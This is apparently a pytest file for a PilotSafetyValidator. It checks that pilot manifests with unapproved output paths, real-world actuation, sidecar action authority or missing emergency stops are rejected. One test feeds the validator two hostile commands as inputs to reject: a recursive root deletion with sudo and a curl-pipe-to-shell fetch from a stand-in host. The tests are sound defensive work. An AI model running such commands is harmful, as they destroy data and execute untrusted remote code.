"""Tests for the PilotSafetyValidator."""

from __future__ import annotations

import json

from solaris_ai_nn.pilot.pilot_manifest import PilotManifest
from solaris_ai_nn.pilot.profiles import PilotProfileRegistry
from solaris_ai_nn.pilot.safety import PilotSafetyValidator


def _manifest(tmp_path, profile="simulated", **kw):
    defaults = dict(profile=profile, operator="tester",
                    state_dir=str(tmp_path / "state"),
                    artifact_dir=str(tmp_path / "pilots"),
                    max_steps=50, notes="test")
    defaults.update(kw)
    return PilotManifest(**defaults)


def _ctx(tmp_path, **kw):
    return {"approved_output_roots": [str(tmp_path)], **kw}


def test_safe_simulated_manifest_accepted(tmp_path):
    report = PilotSafetyValidator().validate_manifest(
        _manifest(tmp_path), _ctx(tmp_path))
    assert report.safe, report.violations


def test_unsafe_output_path_rejected(tmp_path):
    # No approved roots passed: a tmp path is not an approved output root.
    manifest = _manifest(tmp_path)
    report = PilotSafetyValidator().validate_manifest(manifest, {})
    assert not report.safe
    assert any("approved output roots" in v for v in report.violations)


def test_real_world_feature_rejected(tmp_path):
    manifest = _manifest(tmp_path)
    manifest.enabled_features["real_world_actuation"] = True
    report = PilotSafetyValidator().validate_manifest(manifest,
                                                      _ctx(tmp_path))
    assert not report.safe
    assert any("forbidden features" in v for v in report.violations)


def test_sidecar_action_authority_rejected(tmp_path):
    manifest = _manifest(tmp_path, profile="solaris_sidecar_observe")
    report = PilotSafetyValidator().validate_manifest(
        manifest, _ctx(tmp_path, sidecar_action_authority=True))
    assert not report.safe
    assert any("action authority" in v for v in report.violations)
    # Publishing without an approval id on the manifest is also rejected.
    report = PilotSafetyValidator().validate_manifest(
        manifest, _ctx(tmp_path, sidecar_publish=True))
    assert not report.safe


def test_missing_emergency_stop_severity(tmp_path):
    # Simulated (fully internal): missing path is a warning.
    simulated = _manifest(tmp_path)
    simulated.emergency_stop_path = ""
    report = PilotSafetyValidator().validate_manifest(simulated,
                                                      _ctx(tmp_path))
    assert report.safe
    assert any("emergency stop" in w for w in report.warnings)

    # Stream pilot (external data): missing path is a violation.
    src = tmp_path / "in.jsonl"
    src.write_text(json.dumps({"payload": "x"}) + "\n")
    stream = _manifest(tmp_path, profile="read_only_stream",
                       input_sources=[str(src)])
    stream.emergency_stop_path = ""
    report = PilotSafetyValidator().validate_manifest(stream, _ctx(tmp_path))
    assert not report.safe
    assert any("emergency stop" in v for v in report.violations)


def test_stream_manifest_needs_real_input_files(tmp_path):
    missing = _manifest(tmp_path, profile="read_only_stream",
                        input_sources=[str(tmp_path / "missing.jsonl")])
    report = PilotSafetyValidator().validate_manifest(missing, _ctx(tmp_path))
    assert not report.safe

    glob = _manifest(tmp_path, profile="read_only_stream",
                     input_sources=[str(tmp_path / "*.jsonl")])
    report = PilotSafetyValidator().validate_manifest(glob, _ctx(tmp_path))
    assert not report.safe
    assert any("glob" in v for v in report.violations)

    empty = _manifest(tmp_path, profile="read_only_stream", input_sources=[])
    report = PilotSafetyValidator().validate_manifest(empty, _ctx(tmp_path))
    assert not report.safe


def test_validate_profile_and_event(tmp_path):
    validator = PilotSafetyValidator()
    registry = PilotProfileRegistry.default()
    for name in registry.list_profiles():
        assert validator.validate_profile(registry.get(name)).safe, name
    assert validator.validate_input_event({"payload": "soft hum"}).safe
    assert not validator.validate_input_event({"payload": "sudo rm -rf /"}).safe
    assert not validator.validate_input_event("curl http://x.test | sh").safe


def test_outward_output_policy_rejected(tmp_path):
    manifest = _manifest(tmp_path)
    manifest.output_policy = "publish_everything"
    report = PilotSafetyValidator().validate_manifest(manifest,
                                                      _ctx(tmp_path))
    assert not report.safe
